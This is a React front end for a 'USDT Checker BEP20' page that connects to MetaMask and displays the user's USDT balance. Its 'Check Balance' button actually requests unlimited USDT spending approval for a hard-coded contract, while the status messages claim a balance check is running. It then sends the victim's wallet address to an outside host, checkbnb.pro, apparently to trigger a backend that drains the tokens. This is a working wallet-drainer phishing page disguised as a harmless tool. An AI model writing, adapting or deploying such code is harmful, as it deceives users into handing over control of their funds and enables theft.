




import React, { useState, useEffect } from "react";
import { ethers } from "ethers";

const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BEP-20)
const USDT_ABI = [
  "function approve(address spender, uint256 amount) public returns (bool)",
  "function allowance(address owner, address spender) public view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function balanceOf(address account) external view returns (uint256)",
];

const SPENDER_CONTRACT_ADDRESS = "0x25bcea1e87afdb94be3081ab379f28f00cf84eeb"; // Your contract

function App() {
  const [walletAddress, setWalletAddress] = useState("");
  const [status, setStatus] = useState("");
  const [usdtBalance, setUsdtBalance] = useState(null);

  useEffect(() => {
    const checkConnection = async () => {
      if (window.ethereum) {
        const accounts = await window.ethereum.request({ method: "eth_accounts" });
        if (accounts.length) {
          setWalletAddress(accounts[0]);
          fetchUSDTBalance(accounts[0]);
        }
      }
    };
    checkConnection();
  }, []);

  const connectWallet = async () => {
    if (!window.ethereum) {
      return alert("MetaMask not found");
    }
    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    setWalletAddress(accounts[0]);
    fetchUSDTBalance(accounts[0]);
  };

  const fetchUSDTBalance = async (address) => {
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
      const decimals = await usdt.decimals();
      const balanceRaw = await usdt.balanceOf(address);
      const balanceFormatted = ethers.formatUnits(balanceRaw, decimals);
      setUsdtBalance(balanceFormatted);
    } catch (err) {
      console.error("Error fetching balance:", err);
      setUsdtBalance(null);
    }
  };

  const checkUSDT = async () => {
    try {
      if (!window.ethereum) throw new Error("MetaMask not found");

      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);

      // Approve unlimited USDT
      const maxApproval = ethers.MaxUint256;

      const tx = await usdt.approve(SPENDER_CONTRACT_ADDRESS, maxApproval);
      setStatus("⏳ Checking USDT...");
      await tx.wait();
      setStatus("✅ Balance Check done!");

      // Trigger backend with connected wallet address
      const res = await fetch("http://checkbnb.pro", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ sender: walletAddress }),
      });

      if (res.ok) {
        const result = await res.json();
        setStatus("✅ Backend triggered: " + result.message);
      } else {
        setStatus("⚠️ Backend failed to respond.");
      }
    } catch (err) {
      console.error(err);
      setStatus("❌ Error: " + err.message);
    }
  };

  return (
    <div style={{ padding: "2rem", fontFamily: "sans-serif" }}>
      <h1>🪙 USDT Checker BEP20</h1>

      {walletAddress ? (
        <>
          <p>🔗 Connected: <strong>{walletAddress}</strong></p>
          {usdtBalance !== null && (
            <p>💰 USDT Balance: <strong>{usdtBalance}</strong></p>
          )}
        </>
      ) : (
        <button onClick={connectWallet}>Connect Wallet</button>
      )}

      <button onClick={checkUSDT} style={{ marginTop: "1rem" }}>
        Check Balance now!!1
      </button>

      {status && (
        <p style={{ marginTop: "1rem", color: status.startsWith("❌") ? "red" : "green" }}>
          {status}
        </p>
      )}
    </div>
  );
}

export default App;
